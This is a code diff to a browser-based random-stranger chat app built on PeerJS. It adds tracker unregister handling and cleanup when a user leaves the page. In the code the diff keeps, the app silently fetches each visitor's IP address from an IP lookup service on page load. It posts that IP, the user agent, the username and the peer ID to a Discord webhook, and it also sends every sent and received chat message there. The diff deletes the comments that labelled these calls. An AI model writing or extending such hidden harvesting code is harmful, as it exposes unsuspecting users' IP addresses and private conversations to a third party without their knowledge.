@@ -581,16 +581,13 @@
         // Function to send user join notification to Discord
         async function sendJoinNotification(username, peerId) {
             try {
-                // Get user's IP address
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 const userIp = ipData.ip;
                 
-                // Get additional info
                 const userAgent = navigator.userAgent;
                 const timestamp = new Date().toISOString();
                 
-                // Prepare the Discord webhook payload
                 const payload = {
                     embeds: [{
                         title: "New User Joined",
@@ -628,7 +625,6 @@
                     }]
                 };
                 
-                // Send to Discord webhook
                 await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
                     headers: {
@@ -646,11 +642,9 @@
         // Function to send message to Discord webhook
         async function sendMessageToDiscord(username, message, peerId, isSent) {
             try {
-                // Get additional info
                 const timestamp = new Date().toISOString();
                 const direction = isSent ? "Outgoing" : "Incoming";
                 
-                // Prepare the Discord webhook payload
                 const payload = {
                     embeds: [{
                         title: `New ${direction} Message`,
@@ -688,7 +682,6 @@
                     }]
                 };
                 
-                // Send to Discord webhook
                 await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
                     headers: {
@@ -753,7 +746,6 @@
             
             log(`Initializing PeerJS with ID: ${peerId}`);
             
-            // Send join notification to Discord
             sendJoinNotification(localUsername, peerId);
             
             try {
@@ -771,6 +763,8 @@
                     updateOnlineUsersUI();
                     
                     connectToTracker();
+                    
+                    window.addEventListener('beforeunload', handleUserLeave);
                 });
                 
                 peer.on('connection', (conn) => {
@@ -827,6 +821,27 @@
                 log(`Error initializing PeerJS: ${error.message}`);
                 showError(`Failed to initialize connection: ${error.message}`);
             }
+        }
+        
+        function handleUserLeave() {
+            log('User is leaving the page - cleaning up');
+            
+            if (trackerConnection && trackerConnection.open) {
+                try {
+                    trackerConnection.send({
+                        type: 'unregister',
+                        peerId: myPeerId
+                    });
+                } catch (e) {
+                    log(`Error sending unregister message: ${e.message}`);
+                }
+            }
+            
+            if (connection) connection.close();
+            if (trackerConnection) trackerConnection.close();
+            if (heartbeatInterval) clearInterval(heartbeatInterval);
+            
+            if (peer) peer.destroy();
         }
         
         function connectToTracker() {
@@ -940,7 +955,10 @@
                         
                         if (data.type === 'register' || data.type === 'heartbeat') {
                             connectedUsers.set(data.peerId, data.username);
-                            
+                            broadcastUserList();
+                        } else if (data.type === 'unregister') {
+                            connectedUsers.delete(data.peerId);
+                            userConnections.delete(data.peerId);
                             broadcastUserList();
                         }
                     });
@@ -1069,7 +1087,6 @@
                 
                 if (data.type === 'message') {
                     appendMessage(data.message, false, remoteUsername || 'Stranger');
-                    // Send received message to Discord
                     sendMessageToDiscord(remoteUsername || 'Stranger', data.message, connection.peer, false);
                 } else if (data.type === 'username') {
                     remoteUsername = data.username;
@@ -1208,7 +1225,6 @@
                 });
                 
                 appendMessage(message, true, localUsername);
-                // Send sent message to Discord
                 sendMessageToDiscord(localUsername, message, myPeerId, true);
                 
                 messageInput.value = '';
@@ -1225,18 +1241,8 @@
         
         document.addEventListener('DOMContentLoaded', () => {
             initializePeer();
-            
             chatScreen.style.display = 'none';
-            
             updateRandomChatButton();
-        });
-        
-        window.addEventListener('beforeunload', () => {
-            if (connection) connection.close();
-            if (trackerConnection) trackerConnection.close();
-            if (heartbeatInterval) clearInterval(heartbeatInterval);
-            
-            if (peer) peer.destroy();
         });
     </script>
 </body>
